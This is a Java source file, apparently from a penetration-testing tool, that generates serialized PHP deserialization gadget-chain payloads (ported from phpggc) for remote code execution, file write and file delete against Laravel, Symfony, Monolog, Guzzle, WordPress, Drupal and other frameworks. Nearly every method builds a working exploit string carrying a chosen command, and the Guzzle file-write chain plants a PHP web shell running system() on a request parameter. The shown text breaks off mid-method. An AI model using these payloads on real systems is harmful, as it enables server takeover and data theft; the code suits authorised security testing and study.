package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * PHP deserialization payload generators — ported from phpggc.
 *
 * Pure string construction of PHP serialize() format.
 * No external dependencies needed — payloads are serialized PHP objects as strings.
 *
 * Chain naming follows phpggc convention: Framework/Type_Version
 * Types: RCE (Remote Code Execution), FW (File Write), FD (File Delete), FR (File Read)
 *
 * References: https://github.com/ambionics/phpggc
 */
public final class PhpPayloads {

    private PhpPayloads() {}

    /* ════════════════════════════════════════════════════════════════════════
     *  Chain catalog — populates the UI dropdown
     * ════════════════════════════════════════════════════════════════════════ */

    public static Map<String, String> getChains() {
        Map<String, String> c = new LinkedHashMap<>();

        // ── Laravel ────────────────────────────────────────────────────────
        c.put("Laravel/RCE1",  "Laravel 5.4.27 — Faker\\Generator __destruct → call_user_func");
        c.put("Laravel/RCE2",  "Laravel 5.4.0–8.x — Events\\Dispatcher __destruct RCE");
        c.put("Laravel/RCE3",  "Laravel 5.5.0–5.8.35 — ChannelManager __destruct RCE");
        c.put("Laravel/RCE4",  "Laravel 5.4.0–8.x — Validation\\Validator __destruct RCE");
        c.put("Laravel/RCE7",  "Laravel ≤8.16.1 — CallQueuedClosure __destruct RCE");
        c.put("Laravel/RCE9",  "Laravel 5.4.0–9.x — BroadcastEvent __destruct RCE");
        c.put("Laravel/RCE10", "Laravel 5.6.0–9.x — RequestGuard __toString RCE");
        c.put("Laravel/RCE17", "Laravel 10.31+ — PendingSingletonResourceRegistration __destruct");
        c.put("Laravel/RCE20", "Laravel 5.6–10.x — PendingResourceRegistration __destruct");

        // ── Symfony ────────────────────────────────────────────────────────
        c.put("Symfony/RCE1",  "Symfony 3.1–3.4.34 — ApcuAdapter __destruct → proc_open");
        c.put("Symfony/RCE4",  "Symfony 3.4/4.2/4.3 — TagAwareAdapter __destruct (CVE-2019-18889)");
        c.put("Symfony/RCE5",  "Symfony 5.2 — DumpDataCollector __destruct RCE");
        c.put("Symfony/RCE6",  "Symfony 3.4–4.1 — ImportConfigurator __destruct → command");
        c.put("Symfony/RCE7",  "Symfony 3.2–4.3 — TagAwareAdapter variant __destruct");
        c.put("Symfony/RCE9",  "Symfony 2.6–4.4 — ArrayObject + SortableIterator __destruct");
        c.put("Symfony/RCE10", "Symfony 2.0–5.4 — BrowserKit\\Response __toString RCE");
        c.put("Symfony/RCE11", "Symfony 2.0–5.4 — ConstraintViolationList __destruct RCE");

        // ── Monolog ────────────────────────────────────────────────────────
        c.put("Monolog/RCE1",  "Monolog 1.4–2.7 — SyslogUdpHandler + BufferHandler __destruct");
        c.put("Monolog/RCE2",  "Monolog 1.4–2.7 — SyslogUdpHandler + BufferHandler variant");
        c.put("Monolog/RCE3",  "Monolog 1.1–1.10 — BufferHandler __destruct RCE");
        c.put("Monolog/RCE5",  "Monolog 1.25–2.7 — FingersCrossedHandler + GroupHandler");
        c.put("Monolog/RCE6",  "Monolog 1.10–2.7 — FingersCrossedHandler + BufferHandler");
        c.put("Monolog/RCE7",  "Monolog 1.10–2.7 — FingersCrossedHandler __destruct");
        c.put("Monolog/RCE8",  "Monolog 3.0+ — GroupHandler __destruct RCE");
        c.put("Monolog/RCE9",  "Monolog 3.0+ — FingersCrossedHandler __destruct RCE");

        // ── Guzzle ─────────────────────────────────────────────────────────
        c.put("Guzzle/RCE1",   "Guzzle 6.0–6.3 — FnStream + HandlerStack __destruct");
        c.put("Guzzle/FW1",    "Guzzle 4.0–7.5+ — FileCookieJar __destruct file write");

        // ── WordPress ──────────────────────────────────────────────────────
        c.put("WordPress/RCE1", "WordPress ≤6.3.1 — WP_Theme __toString complex chain");
        c.put("WordPress/RCE2", "WordPress 6.4.0–6.4.1 — WP_HTML_Token __destruct");

        // ── Doctrine ───────────────────────────────────────────────────────
        c.put("Doctrine/RCE1", "Doctrine 1.5–2.7 — CacheAdapter __destruct → file include");
        c.put("Doctrine/RCE2", "Doctrine 1.11–2.3 — CacheAdapter + RedisProxy __destruct");

        // ── CodeIgniter4 ───────────────────────────────────────────────────
        c.put("CodeIgniter4/RCE1", "CI4 4.0.2–4.0.3 — RedisHandler __destruct RCE");
        c.put("CodeIgniter4/RCE2", "CI4 4.0.0–4.3.6 — RedisHandler __destruct variant");
        c.put("CodeIgniter4/RCE3", "CI4 4.0.4–4.4.3 — RedisHandler __destruct variant");

        // ── ThinkPHP ───────────────────────────────────────────────────────
        c.put("ThinkPHP/RCE1", "ThinkPHP 5.1–5.2 — Pivot + Windows pipes __destruct");
        c.put("ThinkPHP/RCE2", "ThinkPHP 5.0.24 — Windows pipes __destruct RCE");

        // ── Yii ────────────────────────────────────────────────────────────
        c.put("Yii2/RCE1", "Yii2 <2.0.38 — BatchQueryResult __destruct (CVE-2020-15148)");

        // ── CakePHP ────────────────────────────────────────────────────────
        c.put("CakePHP/RCE1", "CakePHP ≤3.9.6 — Symfony\\Process __destruct → command");

        // ── Drupal ─────────────────────────────────────────────────────────
        c.put("Drupal7/RCE1",  "Drupal 7.0–7.98 — SchemaCache __destruct RCE");
        c.put("Drupal/RCE1",   "Drupal 8.9–9.5+ — FileCookieJar + Container __destruct");

        // ── ZendFramework ──────────────────────────────────────────────────
        c.put("ZendFramework/RCE3", "Zend 2.0–? — Zend\\Log\\Logger __destruct RCE");

        // ── Slim ───────────────────────────────────────────────────────────
        c.put("Slim/RCE1", "Slim 3.8.1 — Slim\\Http\\Response __toString RCE");

        // ── Magento ────────────────────────────────────────────────────────
        c.put("Magento/FW1", "Magento ≤1.9.4 — Zend_Memory_Manager __destruct file write");

        // ── Phalcon ────────────────────────────────────────────────────────
        c.put("Phalcon/RCE1", "Phalcon ≤1.2.2 — Logger\\Adapter\\File __wakeup → eval input");

        // ── SwiftMailer ────────────────────────────────────────────────────
        c.put("SwiftMailer/FD1", "SwiftMailer 5.4–6.2 — TemporaryFileByteStream __destruct file delete");

        // ── Generic ────────────────────────────────────────────────────────
        c.put("Generic/__destruct", "Generic __destruct / __wakeup → system() call");
        c.put("Generic/__toString", "Generic __toString → call_user_func system()");

        return c;
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Payload generation dispatcher
     * ════════════════════════════════════════════════════════════════════════ */

    /** Available PHP functions for RCE:FunctionCall chains. */
    public static List<String> getFunctions() {
        return List.of(
            "system", "exec", "passthru", "shell_exec", "popen",
            "proc_open", "pcntl_exec", "assert", "eval",
            "file_get_contents", "file_put_contents", "unlink",
            "include", "require", "call_user_func"
        );
    }

    /** Generate with explicit function choice (used by UI). */
    public static byte[] generate(String chain, String function, String command) {
        String payload = dispatch(chain, function, command);
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    /** Backward-compatible: defaults to "system". Used by auto-scanner. */
    public static byte[] generate(String chain, String command) {
        return generate(chain, "system", command);
    }

    private static String dispatch(String chain, String fn, String cmd) {
        return switch (chain) {
            // Laravel
            case "Laravel/RCE1"  -> laravelRce1(fn, cmd);
            case "Laravel/RCE2"  -> laravelRce2(fn, cmd);
            case "Laravel/RCE3"  -> laravelRce3(fn, cmd);
            case "Laravel/RCE4"  -> laravelRce4(fn, cmd);
            case "Laravel/RCE7"  -> laravelRce7(fn, cmd);
            case "Laravel/RCE9"  -> laravelRce9(fn, cmd);
            case "Laravel/RCE10" -> laravelRce10(fn, cmd);
            case "Laravel/RCE17" -> laravelRce17(fn, cmd);
            case "Laravel/RCE20" -> laravelRce20(fn, cmd);

            // Symfony
            case "Symfony/RCE1"  -> symfonyRce1(fn, cmd);
            case "Symfony/RCE4"  -> symfonyRce4(fn, cmd);
            case "Symfony/RCE5"  -> symfonyRce5(fn, cmd);
            case "Symfony/RCE6"  -> symfonyRce6(fn, cmd);
            case "Symfony/RCE7"  -> symfonyRce7(fn, cmd);
            case "Symfony/RCE9"  -> symfonyRce9(fn, cmd);
            case "Symfony/RCE10" -> symfonyRce10(fn, cmd);
            case "Symfony/RCE11" -> symfonyRce11(fn, cmd);

            // Monolog
            case "Monolog/RCE1"  -> monologRce1(fn, cmd);
            case "Monolog/RCE2"  -> monologRce2(fn, cmd);
            case "Monolog/RCE3"  -> monologRce3(fn, cmd);
            case "Monolog/RCE5"  -> monologRce5(fn, cmd);
            case "Monolog/RCE6"  -> monologRce6(fn, cmd);
            case "Monolog/RCE7"  -> monologRce7(fn, cmd);
            case "Monolog/RCE8"  -> monologRce8(fn, cmd);
            case "Monolog/RCE9"  -> monologRce9(fn, cmd);

            // Guzzle
            case "Guzzle/RCE1"   -> guzzleRce1(fn, cmd);
            case "Guzzle/FW1"    -> guzzleFw1(cmd);  // file write — no function param

            // WordPress
            case "WordPress/RCE1" -> wordpressRce1(fn, cmd);
            case "WordPress/RCE2" -> wordpressRce2(fn, cmd);

            // Doctrine
            case "Doctrine/RCE1" -> doctrineRce1(fn, cmd);
            case "Doctrine/RCE2" -> doctrineRce2(fn, cmd);

            // CodeIgniter4
            case "CodeIgniter4/RCE1" -> codeIgniter4Rce1(cmd);   // structural — no fn slot
            case "CodeIgniter4/RCE2" -> codeIgniter4Rce2(cmd);
            case "CodeIgniter4/RCE3" -> codeIgniter4Rce3(cmd);

            // ThinkPHP
            case "ThinkPHP/RCE1" -> thinkPhpRce1(fn, cmd);
            case "ThinkPHP/RCE2" -> thinkPhpRce2(cmd);           // pipes only — no fn slot

            // Yii
            case "Yii2/RCE1" -> yii2Rce1(fn, cmd);

            // CakePHP
            case "CakePHP/RCE1" -> cakePhpRce1(cmd);             // Process — command only

            // Drupal
            case "Drupal7/RCE1" -> drupal7Rce1(fn, cmd);
            case "Drupal/RCE1"  -> drupalRce1(cmd);              // file write chain

            // ZendFramework
            case "ZendFramework/RCE3" -> zendRce3(fn, cmd);

            // Slim
            case "Slim/RCE1" -> slimRce1(fn, cmd);

            // Magento
            case "Magento/FW1" -> magentoFw1(cmd);               // file write — no fn

            // Phalcon
            case "Phalcon/RCE1" -> phalconRce1(cmd);             // structural — no fn slot

            // SwiftMailer
            case "SwiftMailer/FD1" -> swiftmailerFd1(cmd);       // file delete — no fn

            // Generic
            case "Generic/__destruct" -> genericDestruct(fn, cmd);
            case "Generic/__toString" -> genericToString(fn, cmd);

            default -> throw new IllegalArgumentException("Unknown PHP chain: " + chain);
        };
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Helper — PHP string length uses byte count (UTF-8)
     * ════════════════════════════════════════════════════════════════════════ */

    /** PHP s:len:"value"; — len must be byte length, not char length. */
    private static String s(String value) {
        int byteLen = value.getBytes(StandardCharsets.UTF_8).length;
        return "s:" + byteLen + ":\"" + value + "\";";
    }

    /** PHP s:len:"value"; without trailing semicolon (for use inside nested structures). */
    private static String sNoSemi(String value) {
        int byteLen = value.getBytes(StandardCharsets.UTF_8).length;
        return "s:" + byteLen + ":\"" + value + "\"";
    }

    /** Protected property key: \0*\0name — byte length includes the 3 null/star/null bytes. */
    private static String protKey(String name) {
        int byteLen = name.length() + 3; // \0*\0 = 3 extra bytes
        return "s:" + byteLen + ":\"\0*\0" + name + "\"";
    }

    /** Private property key: \0ClassName\0name. */
    private static String privKey(String className, String name) {
        int byteLen = className.length() + name.length() + 2; // \0Class\0 = 2 null bytes
        return "s:" + byteLen + ":\"\0" + className + "\0" + name + "\"";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  LARAVEL CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Laravel/RCE1 — Faker\Generator __destruct → call_user_func
     * Laravel 5.4.27
     */
    private static String laravelRce1(String fn, String cmd) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                protKey("events") + ";O:26:\"Faker\\DefaultGenerator\":1:{" +
                protKey("default") + ";" + s(fn) + "}" +
                protKey("event") + ";" + s(cmd) + "}";
    }

    /**
     * Laravel/RCE2 — Events\Dispatcher __destruct RCE
     * Laravel 5.4.0–8.x (widest coverage)
     */
    private static String laravelRce2(String fn, String cmd) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                protKey("events") + ";O:28:\"Illuminate\\Events\\Dispatcher\":1:{" +
                protKey("listeners") + ";a:1:{" +
                sNoSemi(cmd) + ";a:1:{i:0;" + s(fn) + "}}}" +
                protKey("event") + ";" + s(cmd) + "}";
    }

    /**
     * Laravel/RCE3 — ChannelManager __destruct RCE
     * Laravel 5.5.0–5.8.35
     */
    private static String laravelRce3(String fn, String cmd) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                protKey("events") + ";O:46:\"Illuminate\\Notifications\\ChannelManager\":3:{" +
                protKey("app") + ";" + s(cmd) +
                protKey("customCreators") + ";a:1:{" + sNoSemi("x") + ";" + s(fn) + "}" +
                protKey("defaultChannel") + ";" + s("x") + "}" +
                protKey("event") + ";" + s(cmd) + "}";
    }

    /**
     * Laravel/RCE4 — Validation\Validator __destruct RCE
     * Laravel 5.4.0–8.x
     */
    private static String laravelRce4(String fn, String cmd) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                protKey("events") + ";O:36:\"Illuminate\\Validation\\Validator\":1:{" +
                protKey("extensions") + ";a:1:{" + sNoSemi(fn) + ";" + s(fn) + "}}" +
                protKey("event") + ";" + s(cmd) + "}";
    }

    /**
     * Laravel/RCE7 — CallQueuedClosure __destruct RCE
     * Laravel ≤8.16.1
     */
    private static String laravelRce7(String fn, String cmd) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                protKey("events") + ";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{" +
                protKey("queueResolver") + ";" + s(fn) + "}" +
                protKey("event") + ";O:38:\"Illuminate\\Queue\\CallQueuedClosure\":1:{" +
                "s:10:\"connection\";" + s(cmd) + "}}";
    }

    /**
     * Laravel/RCE9 — BroadcastEvent __destruct RCE
     * Laravel 5.4.0–9.x (very wide coverage)
     */
    private static String laravelRce9(String fn, String cmd) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                protKey("events") + ";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{" +
                protKey("queueResolver") + ";" + s(fn) + "}" +
                protKey("event") + ";O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{" +
                "s:10:\"connection\";" + s(cmd) + "}}";
    }

    /**
     * Laravel/RCE10 — RequestGuard __toString RCE
     * Laravel 5.6.0–9.x
     */
    private static String laravelRce10(String fn, String cmd) {
        return "O:44:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{" +
                protKey("condition") + ";O:34:\"Illuminate\\Auth\\RequestGuard\":3:{" +
                protKey("callback") + ";" + s(fn) +
                protKey("request") + ";" + s(cmd) +
                protKey("provider") + ";" + s(cmd) + "}}";
    }

    /**
     * Laravel/RCE17 — PendingSingletonResourceRegistration __destruct
     * Laravel 10.31+
     */
    private static String laravelRce17(String fn, String cmd) {
        return "O:61:\"Illuminate\\Routing\\PendingSingletonResourceRegistration\":2:{" +
                protKey("registrar") + ";O:36:\"Illuminate\\Validation\\Validator\":1:{" +
                protKey("extensions") + ";a:1:{" + sNoSemi(fn) + ";" + s(fn) + "}}" +
                protKey("registered") + ";b:0;" +
                protKey("name") + ";" + s(cmd) +
                protKey("controller") + ";" + s("x") +
                protKey("options") + ";a:0:{}}";
    }

    /**
     * Laravel/RCE20 — PendingResourceRegistration __destruct
     * Laravel 5.6–10.x (very wide coverage)
     */
    private static String laravelRce20(String fn, String cmd) {
        return "O:52:\"Illuminate\\Routing\\PendingResourceRegistration\":2:{" +
                protKey("registrar") + ";O:36:\"Illuminate\\Validation\\Validator\":1:{" +
                protKey("extensions") + ";a:1:{" + sNoSemi(fn) + ";" + s(fn) + "}}" +
                protKey("registered") + ";b:0;" +
                protKey("name") + ";" + s(cmd) +
                protKey("controller") + ";" + s("x") +
                protKey("options") + ";a:0:{}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  SYMFONY CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Symfony/RCE1 — ApcuAdapter __destruct → proc_open
     * Symfony 3.1–3.4.34
     */
    private static String symfonyRce1(String fn, String cmd) {
        return "O:56:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "mergeByLifetime") +
                ";" + s(fn) +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "namespace") +
                ";" + s("") +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "deferred") +
                ";a:1:{i:0;" + s(cmd) + "}}";
    }

    /**
     * Symfony/RCE4 — TagAwareAdapter __destruct (CVE-2019-18889)
     * Symfony 3.4.0-34, 4.2.0-11, 4.3.0-7
     */
    private static String symfonyRce4(String fn, String cmd) {
        String cacheItem = "O:45:\"Symfony\\Component\\Cache\\CacheItem\":2:{" +
                privKey("Symfony\\Component\\Cache\\CacheItem", "key") + ";" + s(cmd) +
                privKey("Symfony\\Component\\Cache\\CacheItem", "isTaggable") + ";b:1;}";

        return "O:57:\"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\":2:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "deferred") +
                ";a:1:{" + sNoSemi("x") + ";" + cacheItem + "}" +
                privKey("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "pool") +
                ";O:54:\"Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\":2:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "setInnerItem") +
                ";" + s(fn) +
                privKey("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "poolHash") +
                ";" + s("x") + "}}";
    }

    /**
     * Symfony/RCE5 — DumpDataCollector __destruct
     * Symfony 5.2.*
     */
    private static String symfonyRce5(String fn, String cmd) {
        return "O:64:\"Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector\":2:{" +
                privKey("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "dumper") +
                ";" + s(fn) +
                privKey("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "data") +
                ";a:1:{i:0;a:1:{" + sNoSemi("data") + ";" + s(cmd) + "}}}";
    }

    /**
     * Symfony/RCE6 — ImportConfigurator __destruct → command
     * Symfony 3.4-BETA4–3.4.49 & 4.0-BETA4–4.1.13
     * Note: structural chain — fn not applicable, uses cmd directly
     */
    private static String symfonyRce6(String fn, String cmd) {
        return "O:72:\"Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator\":1:{" +
                privKey("Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator", "parent") +
                ";O:50:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{" +
                privKey("Symfony\\Component\\Process\\Pipes\\WindowsPipes", "files") +
                ";a:1:{i:0;" + s(cmd) + "}}}";
    }

    /**
     * Symfony/RCE7 — TagAwareAdapter variant __destruct
     * Symfony 3.2–3.4.34, 4.0–4.2.11, 4.3.0–4.3.7
     */
    private static String symfonyRce7(String fn, String cmd) {
        return "O:57:\"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\":2:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "deferred") +
                ";a:1:{" + sNoSemi("x") + ";O:45:\"Symfony\\Component\\Cache\\CacheItem\":2:{" +
                privKey("Symfony\\Component\\Cache\\CacheItem", "innerItem") + ";" + s(cmd) +
                privKey("Symfony\\Component\\Cache\\CacheItem", "poolHash") + ";" + s("x") + "}}" +
                privKey("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "pool") +
                ";O:54:\"Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\":2:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "setInnerItem") +
                ";" + s(fn) +
                privKey("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "poolHash") +
                ";" + s("x") + "}}";
    }

    /**
     * Symfony/RCE9 — ArrayObject + SortableIterator __destruct
     * Symfony 2.6–4.4.18
     */
    private static String symfonyRce9(String fn, String cmd) {
        String sortable = "O:60:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{" +
                privKey("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "iterator") +
                ";a:1:{i:0;" + s(cmd) + "}" +
                privKey("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "sort") +
                ";" + s(fn) + "}";
        return "O:50:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{" +
                privKey("Symfony\\Component\\Process\\Pipes\\WindowsPipes", "files") +
                ";a:1:{i:0;C:11:\"ArrayObject\":d:{x:i:0;a:0:{};m:a:0:{};s:" +
                sortable.length() + ":\"" + sortable + "\"}}}";
    }

    /**
     * Symfony/RCE10 — BrowserKit\Response __toString RCE
     * Symfony 2.0.4–5.4.24 (widest Symfony coverage)
     */
    private static String symfonyRce10(String fn, String cmd) {
        return "O:44:\"Symfony\\Component\\BrowserKit\\Response\":1:{" +
                privKey("Symfony\\Component\\BrowserKit\\Response", "headers") +
                ";O:60:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{" +
                privKey("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "iterator") +
                ";a:1:{i:0;" + s(cmd) + "}" +
                privKey("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "sort") +
                ";" + s(fn) + "}}";
    }

    /**
     * Symfony/RCE11 — ConstraintViolationList __destruct RCE
     * Symfony 2.0.4–5.4.24
     */
    private static String symfonyRce11(String fn, String cmd) {
        String sortable = "O:60:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{" +
                privKey("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "iterator") +
                ";a:1:{i:0;" + s(cmd) + "}" +
                privKey("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "sort") +
                ";" + s(fn) + "}";
        return "O:61:\"Symfony\\Component\\Validator\\ConstraintViolationList\":1:{" +
                privKey("Symfony\\Component\\Validator\\ConstraintViolationList", "violations") +
                ";a:1:{i:0;" + sortable + "}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  MONOLOG CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Monolog/RCE1 — SyslogUdpHandler + BufferHandler __destruct
     * Monolog 1.4.1–1.6.0, 1.17.2–2.7.0+
     */
    private static String monologRce1(String fn, String cmd) {
        return "O:37:\"Monolog\\Handler\\SyslogUdpHandler\":1:{" +
                protKey("socket") + ";O:29:\"Monolog\\Handler\\BufferHandler\":4:{" +
                protKey("handler") + ";r:2;" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}" +
                protKey("buffer") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";N;}}" +
                protKey("bufferSize") + ";i:-1;}}";
    }

    /**
     * Monolog/RCE2 — SyslogUdpHandler + BufferHandler variant
     * Monolog 1.4.1–2.7.0+
     */
    private static String monologRce2(String fn, String cmd) {
        return "O:37:\"Monolog\\Handler\\SyslogUdpHandler\":1:{" +
                protKey("socket") + ";O:29:\"Monolog\\Handler\\BufferHandler\":4:{" +
                protKey("handler") + ";O:29:\"Monolog\\Handler\\NullHandler\":0:{}" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}" +
                protKey("buffer") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";N;}}" +
                protKey("bufferSize") + ";i:-1;}}";
    }

    /**
     * Monolog/RCE3 — BufferHandler __destruct (simpler chain)
     * Monolog 1.1.0–1.10.0
     */
    private static String monologRce3(String fn, String cmd) {
        return "O:29:\"Monolog\\Handler\\BufferHandler\":4:{" +
                protKey("handler") + ";O:29:\"Monolog\\Handler\\NullHandler\":0:{}" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}" +
                protKey("buffer") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";i:100;}}" +
                protKey("bufferSize") + ";i:-1;}";
    }

    /**
     * Monolog/RCE5 — FingersCrossedHandler + GroupHandler
     * Monolog 1.25–2.7.0+
     */
    private static String monologRce5(String fn, String cmd) {
        return "O:42:\"Monolog\\Handler\\FingersCrossedHandler\":3:{" +
                protKey("passthruLevel") + ";i:0;" +
                protKey("buffer") + ";a:1:{" + sNoSemi("test") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";N;}}}" +
                protKey("handler") + ";O:29:\"Monolog\\Handler\\GroupHandler\":1:{" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}}}";
    }

    /**
     * Monolog/RCE6 — FingersCrossedHandler + BufferHandler
     * Monolog 1.10.0–2.7.0+
     */
    private static String monologRce6(String fn, String cmd) {
        return "O:42:\"Monolog\\Handler\\FingersCrossedHandler\":3:{" +
                protKey("passthruLevel") + ";i:0;" +
                protKey("buffer") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";N;}}" +
                protKey("handler") + ";O:29:\"Monolog\\Handler\\BufferHandler\":3:{" +
                protKey("handler") + ";O:29:\"Monolog\\Handler\\NullHandler\":0:{}" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}" +
                protKey("bufferSize") + ";i:-1;}}";
    }

    /**
     * Monolog/RCE7 — FingersCrossedHandler __destruct
     * Monolog 1.10.0–2.7.0+
     */
    private static String monologRce7(String fn, String cmd) {
        return "O:42:\"Monolog\\Handler\\FingersCrossedHandler\":4:{" +
                protKey("passthruLevel") + ";i:0;" +
                protKey("buffer") + ";a:1:{i:0;" + s(cmd) + "}" +
                protKey("handler") + ";r:1;" +
                protKey("processors") + ";a:2:{i:0;s:3:\"pos\";i:1;" + s(fn) + "}}";
    }

    /**
     * Monolog/RCE8 — GroupHandler __destruct (Monolog v3)
     * Monolog 3.0.0+
     */
    private static String monologRce8(String fn, String cmd) {
        return "O:29:\"Monolog\\Handler\\GroupHandler\":2:{" +
                protKey("handlers") + ";a:1:{i:0;O:29:\"Monolog\\Handler\\NullHandler\":0:{}}" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}" +
                protKey("buffer") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";N;}}}";
    }

    /**
     * Monolog/RCE9 — FingersCrossedHandler __destruct (Monolog v3)
     * Monolog 3.0.0+
     */
    private static String monologRce9(String fn, String cmd) {
        return "O:42:\"Monolog\\Handler\\FingersCrossedHandler\":3:{" +
                protKey("passthruLevel") + ";i:0;" +
                protKey("buffer") + ";a:1:{i:0;a:2:{" +
                sNoSemi("message") + ";" + s(cmd) +
                sNoSemi("level") + ";N;}}" +
                protKey("handler") + ";O:29:\"Monolog\\Handler\\GroupHandler\":1:{" +
                protKey("processors") + ";a:2:{i:0;s:7:\"current\";i:1;" + s(fn) + "}}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  GUZZLE CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Guzzle/RCE1 — FnStream + HandlerStack __destruct
     * Guzzle 6.0.0–6.3.2 (requires Psr7 <1.5.0)
     */
    private static String guzzleRce1(String fn, String cmd) {
        return "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{" +
                privKey("GuzzleHttp\\Psr7\\FnStream", "methods") +
                ";a:1:{" + sNoSemi("close") + ";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{" +
                privKey("GuzzleHttp\\HandlerStack", "handler") + ";" + s(fn) +
                privKey("GuzzleHttp\\HandlerStack", "stack") + ";a:1:{" +
                "i:0;a:1:{i:0;" + s(fn) + "}}" +
                privKey("GuzzleHttp\\HandlerStack", "cached") + ";b:0;}" +
                "i:1;s:7:\"resolve\";}}" +
                "s:9:\"_fn_close\";a:2:{i:0;" + s(fn) + "i:1;" + s(cmd) + "}}";
    }

    /**
     * Guzzle/FW1 — FileCookieJar __destruct → file write
     * Guzzle 4.0.0-rc.2–7.5.0+ (nearly all versions)
     * FileCookieJar.__destruct → save(filename) → writes cookie data to file
     * Command param = path to write to; file content is cookie-like JSON
     */
    private static String guzzleFw1(String cmd) {
        return "O:36:\"GuzzleHttp\\Cookie\\FileCookieJar\":3:{" +
                privKey("GuzzleHttp\\Cookie\\FileCookieJar", "filename") + ";" + s(cmd) +
                privKey("GuzzleHttp\\Cookie\\FileCookieJar", "storeSessionCookies") + ";b:1;" +
                privKey("GuzzleHttp\\Cookie\\CookieJar", "cookies") +
                ";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{" +
                privKey("GuzzleHttp\\Cookie\\SetCookie", "data") +
                ";a:3:{" + sNoSemi("Expires") + ";i:1;" +
                sNoSemi("Discard") + ";b:0;" +
                sNoSemi("Value") + ";" + s("<?php system($_GET['c']); ?>") + "}}}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  WORDPRESS CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * WordPress/RCE1 — WP_Theme __toString complex chain
     * WordPress ≤6.3.1
     */
    private static String wordpressRce1(String fn, String cmd) {
        String hooks = "O:21:\"WpOrg\\Requests\\Hooks\":1:{" +
                protKey("hooks") + ";a:1:{" +
                sNoSemi("wp_theme_name") + ";a:1:{i:0;a:2:{i:0;" + s(fn) + "i:1;i:1;}}}}";
        return "O:8:\"WP_Theme\":3:{" +
                "s:8:\"template\";" + s(cmd) +
